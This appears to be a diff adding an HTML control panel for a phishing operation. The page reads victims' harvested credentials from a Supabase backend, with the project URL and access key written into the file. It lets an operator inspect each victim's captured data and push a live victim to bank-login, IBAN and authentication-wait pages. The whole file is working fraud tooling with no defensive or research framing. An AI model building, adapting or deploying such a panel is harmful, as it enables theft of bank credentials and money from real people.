@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>N3URAL 3NGIN3 PANEL - Command Center</title>
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg-core: #090a0f;
+      --bg-panel: #131622;
+      --border-color: #1e2638;
+      --accent-neon: #00ffcc;
+      --text-main: #f8fafc;
+      --text-muted: #94a3b8;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: 'Inter', sans-serif; background: var(--bg-core); color: var(--text-main); min-height: 100vh; display: flex; flex-direction: column; }
+    header { background: var(--bg-panel); border-bottom: 1px solid var(--border-color); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; }
+    .brand-area { display: flex; align-items: center; gap: 12px; }
+    .brand-icon { width: 12px; height: 12px; background: var(--accent-neon); border-radius: 50%; box-shadow: 0 0 10px var(--accent-neon); }
+    h1 { font-family: 'JetBrains Mono', monospace; font-size: 1.25rem; font-weight: 800; color: #fff; }
+    h1 span { color: var(--accent-neon); }
+    .author-tag { font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: var(--text-muted); background: rgba(255,255,255,0.05); padding: 4px 10px; border-radius: 4px; border: 1px solid var(--border-color); }
+    .container { max-width: 1400px; width: 100%; margin: 30px auto; padding: 0 20px; display: grid; grid-template-columns: 1fr 380px; gap: 25px; flex: 1; }
+    .main-terminal { background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 8px; padding: 20px; }
+    .section-title { font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; color: var(--text-muted); text-transform: uppercase; margin-bottom: 15px; display: flex; justify-content: space-between; }
+    table { width: 100%; border-collapse: collapse; text-align: left; font-size: 0.85rem; }
+    th, td { padding: 12px 10px; border-bottom: 1px solid var(--border-color); }
+    th { color: var(--text-muted); font-family: 'JetBrains Mono', monospace; }
+    .badge { padding: 4px 8px; border-radius: 4px; font-family: 'JetBrains Mono', monospace; font-size: 0.72rem; background: rgba(0,255,204,0.1); color: var(--accent-neon); border: 1px solid rgba(0,255,204,0.2); }
+    .sidebar { display: flex; flex-direction: column; gap: 20px; }
+    .panel-card { background: var(--bg-panel); border: 1px solid var(--border-color); border-radius: 8px; padding: 20px; }
+    .panel-card h3 { font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; margin-bottom: 12px; }
+    .data-viewer { font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; background: #050608; padding: 12px; border-radius: 4px; color: var(--accent-neon); max-height: 250px; overflow-y: auto; border: 1px solid var(--border-color); white-space: pre-wrap; }
+    .action-group { display: flex; flex-wrap: wrap; gap: 4px; }
+    button.steer-btn { background: #1a2234; border: 1px solid var(--border-color); color: var(--text-main); padding: 4px 8px; font-size: 0.7rem; border-radius: 4px; cursor: pointer; font-family: 'JetBrains Mono', monospace; }
+    button.steer-btn:hover { background: var(--accent-neon); color: #000; }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="brand-area">
+      <div class="brand-icon"></div>
+      <h1>N3URAL <span>3NGIN3</span> PANEL</h1>
+    </div>
+    <div class="author-tag">AUTHOR: @lovpeace11</div>
+  </header>
+
+  <div class="container">
+    <div class="main-terminal">
+      <div class="section-title">
+        <span>Active Visitor Sessions & Harvested Credentials</span>
+        <span style="color:var(--accent-neon);">● LIVE SYNC</span>
+      </div>
+      <table>
+        <thead>
+          <tr>
+            <th>Session ID</th>
+            <th>Node</th>
+            <th>Captured Data Preview</th>
+            <th>Steering Actions</th>
+          </tr>
+        </thead>
+        <tbody id="sessionsTableBody">
+          <tr><td colspan="4" style="text-align:center; color:var(--text-muted);">Scanning connections...</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="sidebar">
+      <div class="panel-card">
+        <h3>Detailed Credential Inspector</h3>
+        <p style="font-size:0.78rem; color:var(--text-muted); margin-bottom:8px;">Click any row or preview to inspect full credentials.</p>
+        <div id="inspectorData" class="data-viewer">Select a session...</div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const SUPABASE_URL = 'https://sukmcosjiyvunguultjc.supabase.co';
+    const SUPABASE_ANON_KEY = 'sb_publishable_D4AOhqTP2gOe31LAdzBF3w_BTwh0Ls3';
+    const client = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+    async function fetchSessions() {
+      const { data, error } = await client.from('sessions').select('*').order('updated_at', { ascending: false });
+      const tbody = document.getElementById('sessionsTableBody');
+      if (error || !data || data.length === 0) {
+        tbody.innerHTML = '<tr><td colspan="4" style="text-align:center; color:var(--text-muted);">No active connections.</td></tr>';
+        return;
+      }
+      tbody.innerHTML = '';
+      data.forEach(sess => {
+        const tr = document.createElement('tr');
+        const formattedData = JSON.stringify(sess.data || {}, null, 2);
+        const preview = JSON.stringify(sess.data || {}).substring(0, 35) + '...';
+        tr.innerHTML = `
+          <td><code>${sess.session_id}</code></td>
+          <td><span class="badge">${sess.current_page}</span></td>
+          <td style="cursor:pointer; color:var(--text-muted);" onclick="inspect('${encodeURIComponent(formattedData)}')">${preview}</td>
+          <td>
+            <div class="action-group">
+              <button class="steer-btn" onclick="steer('${sess.session_id}', 'pageEligibility')">Elig</button>
+              <button class="steer-btn" onclick="steer('${sess.session_id}', 'page3')">Info</button>
+              <button class="steer-btn" onclick="steer('${sess.session_id}', 'page4')">Bank</button>
+              <button class="steer-btn" onclick="steer('${sess.session_id}', 'pageAuthWait')">Wait</button>
+              <button class="steer-btn" onclick="steer('${sess.session_id}', 'pageIban')">IBAN</button>
+              <button class="steer-btn" onclick="steer('${sess.session_id}', 'page5')">Done</button>
+            </div>
+          </td>
+        `;
+        tbody.appendChild(tr);
+      });
+    }
+
+    async function steer(sessionId, targetPage) {
+      await client.from('sessions').update({ current_page: targetPage }).eq('session_id', sessionId);
+      fetchSessions();
+    }
+
+    function inspect(jsonStr) {
+      document.getElementById('inspectorData').textContent = JSON.parse('"' + jsonStr + '"');
+    }
+
+    client.channel('public:sessions').on('postgres_changes', { event: '*', schema: 'public', table: 'sessions' }, () => fetchSessions()).subscribe();
+    fetchSessions();
+  </script>
+</body>
+</html>
